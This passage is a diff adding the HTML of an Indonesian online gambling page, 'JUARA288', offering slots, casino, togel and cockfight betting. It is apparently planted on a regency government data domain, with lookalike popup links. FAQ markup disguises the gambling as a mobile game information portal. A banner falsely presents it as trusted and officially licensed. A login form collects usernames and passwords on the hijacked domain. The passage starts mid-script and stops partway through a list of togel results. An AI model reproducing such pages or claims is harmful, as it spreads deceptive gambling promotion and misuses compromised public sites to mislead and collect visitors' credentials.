+          "name": "Apa itu JUARA288?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "JUARA288 merupakan portal akses play game mobile digital yang menghadirkan informasi seputar perkembangan permainan digital, teknologi modern, serta panduan penggunaan platform hiburan berbasis perangkat mobile."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Apa yang ditawarkan oleh JUARA288?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "JUARA288 menyajikan informasi mengenai game mobile digital, perkembangan teknologi permainan, kemudahan navigasi, serta panduan dasar untuk membantu pengunjung mengenal berbagai fitur hiburan digital."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Apakah JUARA288 dapat diakses melalui smartphone?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Pengunjung dapat mengakses portal JUARA288 melalui smartphone maupun perangkat lainnya selama memiliki browser dan koneksi internet yang kompatibel."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Mengapa teknologi penting dalam game mobile digital?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Teknologi berperan dalam mendukung tampilan, responsivitas, kompatibilitas perangkat, dan kemudahan penggunaan sehingga pengalaman menjelajahi hiburan digital menjadi lebih praktis."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Apakah JUARA288 menyediakan informasi panduan bermain?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "JUARA288 mengangkat informasi dan panduan dasar seputar game mobile digital agar pengunjung dapat memahami fitur, mekanisme, serta aturan permainan dengan lebih mudah."
+          }
+        }
+      ]
+    },
+    {
+      "@type": "BreadcrumbList",
+      "@id": "https://old.data.bengkayangkab.go.id/#breadcrumb",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Beranda",
+          "item": "https://old.data.bengkayangkab.go.id/"
+        }
+      ]
+    }
+  ]
+}
+</script>
+	</head>
+
+
+
+	<body>		
+		<div class="wrapper">
+			
+			
+<nav 
+	id="sidebar"
+	class="bg-dark" 
+	style="overflow: auto; opacity: 0.85;"				
+>
+	
+	
+	<div
+		class="d-flex justify-content-between p-3"		
+	>		
+		<a href="https://old.data.bengkayangkab.go.id/">
+			<!-- company logo -->		
+			<div class="ms-3"><img src="https://mayanconstruction.net/image/logo-juara288.gif" style="max-height:43.5px; max-width:150px" alt="Logo JUARA288" ></div>		</a>
+		
+
+		<!-- close button -->
+		<button id="dismiss" type="button" class="btn btn-dark btn-sm no-glass">
+			<i class="bi bi-x-lg" style="font-size:1.5em"></i>
+		</button>
+	</div>
+
+	<!-- user info -->
+	
+	<div class="m-3" >		
+		
+		<ul class="nav nav-pills flex-column mb-auto">
+
+							<li class="nav-item py-1">
+					<a href="https://old.data.bengkayangkab.go.id/" class="nav-link text-white text-uppercase">
+						<i class="fa-solid fa-fw fa-arrow-right-to-bracket fa-xl me-3"></i>
+						Login
+					</a>
+				</li>
+				<li class="nav-item py-1">
+					<a href="https://old.data.bengkayangkab.go.id/" class="nav-link text-white text-uppercase">
+					<i class="fa-regular fa-fw fa-address-card fa-xl me-3"></i>
+						Daftar
+					</a>
+				</li>
+				<li class="nav-item py-1">
+					<a href="https://old.data.bengkayangkab.go.id/" class="nav-link text-white text-uppercase">
+					<i class="fa-solid fa-fw fa-percent fa-xl me-3"></i>
+						Promosi
+					</a>
+				</li>
+				
+				<li class="nav-item">
+					<a href="https://old.data.bengkayangkab.go.id/" class="nav-link text-white text-uppercase">
+						<i class="fa-solid fa-fw fa-list-ol fa-xl me-3"></i>
+						Result Togel
+					</a>
+				</li>
+				
+				<li class="nav-item py-1">
+					<a href="https://old.data.bengkayangkab.go.id/" class="nav-link text-white text-uppercase">
+					<i class="fa-solid fa-fw fa-mobile-screen-button fa-xl me-3"></i>
+						RTP Slot
+					</a>
+				</li>
+
+						
+
+			
+			
+		</ul>
+	</div>
+
+</nav>
+			<div id="content" style="margin-top:60px">
+				<!-- top & bottom navbar -->
+				<div id="navbar-top-wrapper" class="fixed-top">
+    <nav id="navbar-top" class="navbar navbar-dark bg-dark py-1">
+        <div class="container">
+            <!-- menu button -->        
+            <div class="position-relative">
+                <button id="sidebarCollapse" type="button" class="btn btn-dark no-glass">
+                    <i class="bi bi-list" style="font-size:1.5em"></i>
+                    <!-- badge -->
+                                    </button>            
+            </div>
+            <!-- company logo -->
+            <div class="flex-fill text-center">
+                <a href="https://old.data.bengkayangkab.go.id/">            
+                    <img id="navbar-imglogo" src="https://mayanconstruction.net/image/logo-juara288.gif" style="max-height:52px; max-width:220px; margin-left:-36px" alt="Logo JUARA288" >                </a>
+            </div>
+            
+        </div>
+    </nav>
+</div>
+
+
+
+
+<!-- additional navbar not fixed -->
+
+<!-- mobile only -->
+<nav class="menubar navbar navbar-dark bg-dark py-2 px-2 d-xl-none">
+    <div class="container">
+        <div id="category-navbar" class="owl-carousel">
+            <div class="item"><div class="text-center align-middle" style=""><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/home.png" height="35" width="35" style="max-height:35px; max-width:35px; display:inline;" alt="Home Icon" ><div style="font-size:0.65em">Home</div></a></div></div><div class="item"><div class="text-center align-middle" style=""><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/slot.png" height="35" width="35" style="max-height:35px; max-width:35px; display:inline;" alt="Slot Icon" ><div style="font-size:0.65em">Slot</div></a></div></div><div class="item"><div class="text-center align-middle" style=""><a href="https://old.data.bengkayangkab.go.id/?category=102" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/livecasino.png" height="35" width="35" style="max-height:35px; max-width:35px; display:inline;" alt="Casino Icon" ><div style="font-size:0.65em">Casino</div></a></div></div><div class="item"><div class="text-center align-middle" style=""><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/sport.png" height="35" width="35" style="max-height:35px; max-width:35px; display:inline;" alt="Sport Icon" ><div style="font-size:0.65em">Sport</div></a></div></div><div class="item"><div class="text-center align-middle" style=""><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/togel.png" height="35" width="35" style="max-height:35px; max-width:35px; display:inline;" alt="Togel Icon" ><div style="font-size:0.65em">Togel</div></a></div></div><div class="item"><div class="text-center align-middle" style=""><a href="https://old.data.bengkayangkab.go.id/?category=103%2C104%2C105%2C106%2C107" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/table.png" height="35" width="35" style="max-height:35px; max-width:35px; display:inline;" alt="Table Icon" ><div style="font-size:0.65em">Table</div></a></div></div><div class="item"><div class="text-center align-middle" style=""><a href="https://old.data.bengkayangkab.go.id/?category=201" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/fishing.png" height="35" width="35" style="max-height:35px; max-width:35px; display:inline;" alt="Fishing Icon" ><div style="font-size:0.65em">Fishing</div></a></div></div><div class="item"><div class="text-center align-middle" style=""><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/cockfight.png" height="35" width="35" style="max-height:35px; max-width:35px; display:inline;" alt="COCK F. Icon" ><div style="font-size:0.65em">COCK F.</div></a></div></div><div class="item"><div class="text-center align-middle" style=""><a href="https://old.data.bengkayangkab.go.id/?category=151%2C900" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/arcade.png" height="35" width="35" style="max-height:35px; max-width:35px; display:inline;" alt="Arcade Icon" ><div style="font-size:0.65em">Arcade</div></a></div></div><div class="item"><div class="text-center align-middle" style=""><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/promo.png" height="35" width="35" style="max-height:35px; max-width:35px; display:inline;" alt="Promo Icon" ><div style="font-size:0.65em">Promo</div></a></div></div><div class="item"><div class="text-center align-middle" style=""><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/sliders/mega-gacor-icon.png" height="35" width="35" style="max-height:35px; max-width:35px; display:inline;" alt="MEGAGACOR Icon" ><div style="font-size:0.65em">MEGAGACOR</div></a></div></div><div class="item"><div class="text-center align-middle" style=""><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/sliders/goo2500.png" height="35" width="35" style="max-height:35px; max-width:35px; display:inline;" alt="Olympus Icon" ><div style="font-size:0.65em">Olympus</div></a></div></div>        </div>
+    </div>
+</nav>
+<!-- desktop (XL) only -->
+<nav class="menubar navbar navbar-dark bg-dark py-2 px-2 d-none d-xl-block">
+    <div class="container">
+        <div id="category-navbar-desktop" class="d-flex w-100 justify-content-between">
+            <div class="flex-grow-1 text-center align-middle d-none d-lg-block"><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/home.png" height="46" width="46" alt="Home Icon" ><div style="font-size:0.65em">Home</div></a></div><div class="flex-grow-1 text-center align-middle d-none d-lg-block"><a href="https://old.data.bengkayangkab.go.id/?category=101" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/slot.png" height="46" width="46" alt="Slot Icon" ><div style="font-size:0.65em">Slot</div></a></div><div class="flex-grow-1 text-center align-middle d-none d-lg-block"><a href="https://old.data.bengkayangkab.go.id/?category=102" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/livecasino.png" height="46" width="46" alt="Casino Icon" ><div style="font-size:0.65em">Casino</div></a></div><div class="flex-grow-1 text-center align-middle d-none d-lg-block"><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/sport.png" height="46" width="46" alt="Sport Icon" ><div style="font-size:0.65em">Sport</div></a></div><div class="flex-grow-1 text-center align-middle d-none d-lg-block"><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/togel.png" height="46" width="46" alt="Togel Icon" ><div style="font-size:0.65em">Togel</div></a></div><div class="flex-grow-1 text-center align-middle d-none d-lg-block"><a href="https://old.data.bengkayangkab.go.id/?category=103%2C104%2C105%2C106%2C107" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/table.png" height="46" width="46" alt="Table Icon" ><div style="font-size:0.65em">Table</div></a></div><div class="flex-grow-1 text-center align-middle d-none d-lg-block"><a href="https://old.data.bengkayangkab.go.id/?category=201" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/fishing.png" height="46" width="46" alt="Fishing Icon" ><div style="font-size:0.65em">Fishing</div></a></div><div class="flex-grow-1 text-center align-middle d-none d-lg-block"><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/cockfight.png" height="46" width="46" alt="COCK F. Icon" ><div style="font-size:0.65em">COCK F.</div></a></div><div class="flex-grow-1 text-center align-middle d-none d-lg-block"><a href="https://old.data.bengkayangkab.go.id/?category=151%2C900" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/arcade.png" height="46" width="46" alt="Arcade Icon" ><div style="font-size:0.65em">Arcade</div></a></div><div class="flex-grow-1 text-center align-middle d-none d-lg-block"><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/promo.png" height="46" width="46" alt="Promo Icon" ><div style="font-size:0.65em">Promo</div></a></div><div class="flex-grow-1 text-center align-middle d-none d-lg-block"><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/sliders/mega-gacor-icon.png" height="46" width="46" alt="MEGAGACOR Icon" ><div style="font-size:0.65em">MEGAGACOR</div></a></div><div class="flex-grow-1 text-center align-middle d-none d-lg-block"><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none text-white text-uppercase"><img src="https://fffiiillleee.com/open-img-pub/sliders/goo2500.png" height="46" width="46" alt="Olympus Icon" ><div style="font-size:0.65em">Olympus</div></a></div>        </div>
+    </div>
+</nav>				
+				<div id="maincontent"> 
+					<!-- flash -->
+					
+					<!-- content -->
+					
+
+
+
+
+
+<!-- referer:  -->
+
+<!-- popup (if any) -->
+<div class="modal fade" id="popupModal" tabindex="-1" aria-hidden="true"><div class="modal-dialog modal-dialog-centered modal-dialog-scrollable"><div class="modal-content rounded-0"><div class="modal-body p-0"><a href="https://bengkayangkab-go-id.pages.dev/"><img src="https://mayanconstruction.net/image/game-mobile.png" class="w-100" alt="popup image" ></a><div class="pt-3 px-3 text-center"><p><strong>JUARA288 - Portal Akses Play Game Mobile Digital Terbaru</strong><br />
+<strong>Mainkan Sekarang Juga - XiongDi</strong></p>
+</div><div class="d-grid p-2"><button type="button" class="btn btn-primary" data-bs-dismiss="modal">OK</button></div></div></div></div></div><script>window.addEventListener("load", function(){var myModal = new bootstrap.Modal(document.getElementById("popupModal"));myModal.show();});</script>
+
+<!-- slider -->
+	<div class="">
+		<div id="main-slider" class="carousel slide" data-bs-ride="carousel">
+							<div class="carousel-indicators">
+											<button 
+							data-bs-target="#main-slider" 
+							data-bs-slide-to="0" 
+							aria-label="Slide-0" 
+							class="active"						></button>
+											<button 
+							data-bs-target="#main-slider" 
+							data-bs-slide-to="1" 
+							aria-label="Slide-1" 
+													></button>
+											<button 
+							data-bs-target="#main-slider" 
+							data-bs-slide-to="2" 
+							aria-label="Slide-2" 
+													></button>
+											<button 
+							data-bs-target="#main-slider" 
+							data-bs-slide-to="3" 
+							aria-label="Slide-3" 
+													></button>
+											<button 
+							data-bs-target="#main-slider" 
+							data-bs-slide-to="4" 
+							aria-label="Slide-4" 
+													></button>
+									
+				</div>
+						<div class="carousel-inner">
+									<div class="carousel-item active">
+						<a href="https://old.data.bengkayangkab.go.id/">
+							<img src="https://mayanconstruction.net/image/juara288-game-mobile.png" class="w-100" fetchpriority="high" alt="🎁WELCOME TO JUARA288!🎊" >							
+						</a>
+					</div>
+							</div>
+		</div>
+	</div>
+
+
+
+<div class="container"><div id="row-loginmenu" ><div class="my-3 d-xl-none"><div id="row-quicklogin" class="card mb-3"><div class="card-body"><form method="post" accept-charset="utf-8" action="https://old.data.bengkayangkab.go.id/"><div class="form-group mb-3 text"><label class="form-label"  for="username">Username</label><input type="text" name="userName" id="username" class="form-control"/></div>								<div style="position: relative; width:100%;">
+									<div class="form-group mb-3 password"><label class="form-label"  for="pass">Password</label><input type="password" name="password" id="pass" class="form-control"/></div>
+									<span id="togglePass" style="position:absolute; right:12px; top:55%;">
+										<i class="fas fa-eye"></i>
+									</span>
+								</div>
+								<div class="d-flex gap-1 my-3"><button type="submit" class="btn btn-primary flex-fill">LOGIN</button><a href="https://old.data.bengkayangkab.go.id/" class="btn btn-secondary flex-fill">DAFTAR</a></div></form></div></div></div><div class="d-none d-xl-block"><div class="d-flex gap-1 my-3"><a href="https://old.data.bengkayangkab.go.id/" class="btn btn-lg btn-primary flex-fill" id="btn-login">LOGIN</a><a href="https://old.data.bengkayangkab.go.id/" class="btn btn-lg btn-secondary flex-fill" id="btn-register">DAFTAR</a><a href="https://old.data.bengkayangkab.go.id/" class="btn btn-lg btn-danger flex-fill d-none d-lg-block" id="btn-promotion">PROMOSI</a></div></div></div></div>
+<!-- announcement -->
+<div class="my-3">
+    <div id="announcement" class="announcement-bar">
+        <i class="fa-solid fa-bullhorn me-2"></i>
+        <span class="marquee-text">Info : Untuk Saat Ini Hanya Tersedia Deposit Via QRIS | WD Normal | Selamat Datang di Situs Terpercaya &amp; Berlisensi Resmi JUARA2A88 - Menyediakan Portal Play Game Mobile Dan Game Digital Terbaru Sejak 2015.</span>
+    </div>
+</div>
+<script>
+	const marquee = document.querySelector(".marquee-text");
+	const speed = 80;
+	const totalWidth = marquee.offsetWidth + window.innerWidth;
+	const duration = totalWidth / speed;
+	marquee.style.animationDuration = duration + "s";
+</script>
+
+<div class="container">
+
+	<!-- promo sisip -->
+	<div class="row g-1 my-3 d-xl-none"><div class="col"><a href="#" target="_blank" ><img src="https://nxt-upload-bucket.ajp7e.upcloudobjects.com/2026/10/14/IMG_0168-1791982477116.gif" class="w-100" alt="" ></a></div><div class="col"><a href="https://old.data.bengkayangkab.go.id/" target="_blank" ><img src="https://nxt-upload-bucket.ajp7e.upcloudobjects.com/2026/10/14/IMG_0167-1791982497446.gif" class="w-100" alt="" ></a></div><div class="col"><a href="https://old.data.bengkayangkab.go.id/" target="_blank" ><img src="https://nxt-upload-bucket.ajp7e.upcloudobjects.com/2026/10/14/IMG_0166-1791982601912.gif" class="w-100" alt="" ></a></div></div><div class="d-none d-xl-block" style="position:fixed; bottom:80px; left:0; z-index:9990; height:80px;" ><a href="https://old.data.bengkayangkab.go.id/" target="_blank" ><img src="https://nxt-upload-bucket.ajp7e.upcloudobjects.com/2026/10/14/IMG_0166-1791982601912.gif" class="" alt="" height="80" ></a></div><div class="d-none d-xl-block" style="position:fixed; bottom:170px; left:0; z-index:9990; height:80px;" ><a href="https://old.data.bengkayangkab.go.id/" target="_blank" ><img src="https://nxt-upload-bucket.ajp7e.upcloudobjects.com/2026/10/14/IMG_0167-1791982497446.gif" class="" alt="" height="80" ></a></div><div class="d-none d-xl-block" style="position:fixed; bottom:260px; left:0; z-index:9990; height:80px;" ><a href="#" target="_blank" ><img src="https://nxt-upload-bucket.ajp7e.upcloudobjects.com/2026/10/14/IMG_0168-1791982477116.gif" class="" alt="" height="80" ></a></div>
+
+	 <!-- jackpot -->
+               <img
+             src="https://mayanconstruction.net/image/jackpot.gif"
+             class="w-100 img-3d"
+             alt="jackpot" />
+      
+	<!-- togel -->
+		<div id="row-togel" class="my-3">		
+		<div class="d-flex justify-content-between align-items-center mt-3">
+			<h3 class="my-2">Pasaran Togel</h3>
+			<a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none">
+				Lihat lebih banyak <i class="fa-solid fa-angles-right"></i>
+			</a>
+		</div>
+
+		
+
+
+<div id="carousel-togel" class="owl-carousel">        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TOTO MACAU 00:00                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=258" target="_self" class="p-0 m-0 text-decoration-none">
+                            7989                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795538700000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TOTO MACAU 13:00                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=259" target="_self" class="p-0 m-0 text-decoration-none">
+                            1204                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795585500000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TOTO MACAU 16:00                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=260" target="_self" class="p-0 m-0 text-decoration-none">
+                            6477                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795596300000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TOTO MACAU 19:00                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=261" target="_self" class="p-0 m-0 text-decoration-none">
+                            2233                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795520700000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TOTO MACAU 22:00                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=262" target="_self" class="p-0 m-0 text-decoration-none">
+                            5236                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795531500000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TOTO MACAU 23:00                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=263" target="_self" class="p-0 m-0 text-decoration-none">
+                            8175                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795535100000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TOTO WUHAN 00:00                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=264" target="_self" class="p-0 m-0 text-decoration-none">
+                            1302                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795538700000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TOTO WUHAN 09:00                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=265" target="_self" class="p-0 m-0 text-decoration-none">
+                            4579                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795571100000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TOTO WUHAN 12:00                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=266" target="_self" class="p-0 m-0 text-decoration-none">
+                            3107                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795581900000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TOTO WUHAN 15:00                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=267" target="_self" class="p-0 m-0 text-decoration-none">
+                            6416                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795592700000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TOTO WUHAN 18:00                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=268" target="_self" class="p-0 m-0 text-decoration-none">
+                            4840                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795517100000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        TOTO WUHAN 21:00                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=269" target="_self" class="p-0 m-0 text-decoration-none">
+                            6143                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795527900000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        HK SIANG                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=270" target="_self" class="p-0 m-0 text-decoration-none">
+                            8446                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795577400000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        SG METRO                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=271" target="_self" class="p-0 m-0 text-decoration-none">
+                            1554                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795584600000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
